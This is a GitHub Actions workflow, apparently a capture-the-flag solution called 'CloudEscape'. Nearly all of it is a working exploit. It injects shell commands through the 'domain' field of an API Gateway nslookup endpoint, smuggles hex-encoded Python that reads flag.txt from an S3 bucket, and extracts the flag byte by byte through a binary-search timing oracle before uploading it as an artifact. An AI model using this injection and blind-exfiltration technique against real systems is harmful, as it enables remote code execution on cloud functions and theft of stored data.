name: CloudEscape - Direct boto3 Timing Extract
on:
  workflow_dispatch:
  push:
    branches: [corgi]
permissions:
  id-token: write
  contents: read
jobs:
  extract:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: Configure credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Confirm direct boto3 flag access
        run: |
          python3 - <<'PY'
          import json,subprocess,time
          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
          code="import boto3,time;f=boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(2)"
          h=''.join(f'\\x{ord(c):02x}' for c in code)
          p=json.dumps({'domain':f'127.0.0.1;printf "{h}" >/tmp/x.py;/var/lang/bin/python3 /tmp/x.py'})
          t=time.monotonic(); subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',p],stdout=subprocess.DEVNULL); print('elapsed',round(time.monotonic()-t,2),'seconds; expected >2 if direct S3 works')
          PY

      - name: Binary-search 16-byte flag through timing oracle
        run: |
          python3 - <<'PY'
          import json,subprocess,time,string
          api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
          # S3 access itself takes roughly 1-2s; true branch adds 2s.
          # Use a 2.5s cutoff to distinguish false from true.
          def probe(pos,threshold):
              code=("import boto3,time;f=boto3.client('s3',region_name='us-east-1').get_object("+
                    "Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();"+
                    f"time.sleep(2) if f[{pos}]>{threshold} else None")
              h=''.join(f'\\x{ord(c):02x}' for c in code)
              p=json.dumps({'domain':f'127.0.0.1;printf "{h}" >/tmp/x.py;/var/lang/bin/python3 /tmp/x.py'})
              t=time.monotonic()
              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              elapsed=time.monotonic()-t
              print(f'  pos={pos} threshold={threshold} elapsed={elapsed:.2f}s',flush=True)
              return elapsed>3.0
          flag=[]
          for pos in range(16):
              lo,hi=32,126
              while lo<hi:
                  mid=(lo+hi)//2
                  if probe(pos,mid): lo=mid+1
                  else: hi=mid
              ch=chr(lo); flag.append(ch)
              print(f'BYTE {pos}: {lo} {ch!r} | FLAG SO FAR: {"".join(flag)}',flush=True)
          result=''.join(flag)
          print('===== FLAG:',result,'=====')
          open('flag.txt','w').write(result+'\n')
          PY

      - name: Upload extracted flag artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: extracted-flag
          path: flag.txt
          if-no-files-found: ignore
          retention-days: 7

      - name: Final state
        if: always()
        run: |
          echo '=== flag artifact contents, if extraction completed ==='
          test -f flag.txt && cat flag.txt || true
          echo '=== API remains ==='
          curl -s -X POST 'https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup' -H 'Content-Type: application/json' -d '{"domain":"test"}' || true
          echo
          echo 'Direct boto3 timing extraction finished.'
      